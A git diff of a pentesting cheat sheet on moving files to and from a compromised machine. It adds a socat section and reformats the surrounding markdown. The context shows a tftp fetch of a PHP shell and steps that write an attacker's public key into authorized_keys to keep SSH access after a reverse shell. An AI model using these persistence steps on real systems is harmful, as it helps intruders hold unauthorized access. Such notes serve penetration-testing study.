@@ -69,6 +69,25 @@ nc -l 1234 > file.sh
 ```
 
 
+
+## Socat
+
+Server receiving file:
+
+```
+server$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
+client$ socat -u FILE:test.txt TCP:127.0.0.1:9876
+```
+
+Server sending file:
+
+```
+server$ socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr
+client$ socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat
+```
+
+
+
 ## With php
 
 ```
@@ -98,12 +117,12 @@ tftp 191.168.0.101 <<< "get shell5555.php shell5555.php"
 
 If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files.
 
-So, in the `/home/user` directory you can find the hidden `.ssh` files by typing `ls -la`.
+So, in the `/home/user` directory you can find the hidden `.ssh` files by typing `ls -la`.  
 Then you need to do two things.
 
 1. Create a new keypair
 
-You do that with: 
+You do that with:
 
 ```
 ssh-keygen -t rsa -C "your_email@example.com"
@@ -111,22 +130,22 @@ ssh-keygen -t rsa -C "your_email@example.com"
 
 then you enter a name for the key.
 
-Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey
-Enter passphrase (empty for no passphrase): 
+Enter file in which to save the key \(/root/.ssh/id\_rsa\): nameOfMyKey  
+Enter passphrase \(empty for no passphrase\):   
 Enter same passphrase again:
 
 This will create two files, one called `nameOfMyKey` and another called `nameOfMyKey_pub`. The one with the `_pub` is of course your public key. And the other key is your private.
 
-2. Add your public key to authorized_keys.
+1. Add your public key to authorized\_keys.
 
-Now you copy the content of `nameOfMyKey_pub`. 
-On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized_keys. Like this 
+Now you copy the content of `nameOfMyKey_pub`.   
+On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized\_keys. Like this
 
 ```bash
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys
 ```
 
-3. Log in.
+1. Log in.
 
 Now you should be all set to log in using your private key. Like this
 
@@ -145,3 +164,6 @@ scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ex
 # Copy a directory:
 scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
 ```
+
+
+
